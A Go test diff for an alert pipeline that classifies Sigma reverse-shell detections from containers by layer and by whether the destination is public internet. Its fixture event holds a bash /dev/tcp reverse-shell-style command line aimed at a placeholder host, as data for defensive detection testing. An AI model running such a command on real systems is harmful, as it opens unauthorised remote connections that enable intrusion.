@@ -16,6 +16,69 @@ import (
 
 const testSigmaEvent = `{"time":"2026-10-28T12:00:00Z","process_exec":{"process":{"pid":42,"uid":0,"binary":"/bin/sh","arguments":"-c whoami"},"parent":{"pid":1,"uid":0,"binary":"/usr/sbin/sshd","arguments":"-D"}}}`
 
+// A rule that fires on a container's outbound connection carries the
+// destination; whether that destination is ordinary internet traffic decides
+// between a page and a recorded silence.
+func TestSigmaContainerEgressIsClassified(t *testing.T) {
+	cases := []struct {
+		name   string
+		layer  string
+		dst    string
+		egress string
+	}{
+		{"container to the internet", "container", "203.0.113.10", "public"},
+		{"container to a cluster address", "container", "192.168.1.10", ""},
+		{"container to loopback", "container", "127.0.0.1", ""},
+		{"container without a destination", "container", "", ""},
+		{"host to the internet", "host", "203.0.113.10", ""},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			event := map[string]any{
+				"EventType":       "network_connection",
+				"Image":           "/usr/bin/bash",
+				"CommandLine":     "/usr/bin/bash -c \"echo > /dev/tcp/example.invalid/22\"",
+				"User":            "1000",
+				"@timestamp":      "2026-11-16T09:04:52Z",
+				"ContainerName":   "tenant",
+				"DestinationPort": 22,
+			}
+			if tc.dst != "" {
+				event["DestinationIp"] = tc.dst
+			}
+			if tc.layer == "host" {
+				event["ContainerName"] = ""
+			}
+			det, err := json.Marshal(map[string]any{
+				"rule_title": "Linux Reverse Shell Indicator",
+				"rule_id":    "83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871",
+				"level":      "critical",
+				"event":      event,
+			})
+			if err != nil {
+				t.Fatal(err)
+			}
+			a, ok := sigmaDetectionToAlert(string(det), testConfig())
+			if !ok {
+				t.Fatal("detection did not parse")
+			}
+			if a.Labels["layer"] != tc.layer {
+				t.Fatalf("layer = %q, want %q", a.Labels["layer"], tc.layer)
+			}
+			if got := a.Labels["egress"]; got != tc.egress {
+				t.Fatalf("egress = %q, want %q", got, tc.egress)
+			}
+			class, _ := classifyAlert(a)
+			if tc.egress == "public" && class != "tenant_egress" {
+				t.Fatalf("class = %q, want tenant_egress", class)
+			}
+			if tc.layer == "container" && tc.egress == "" && class != "sigma_nonroot" {
+				t.Fatalf("class = %q, want sigma_nonroot", class)
+			}
+		})
+	}
+}
+
 func testDetection(rule, ts string) string {
 	event := map[string]any{
 		"EventType":   "process_exec",
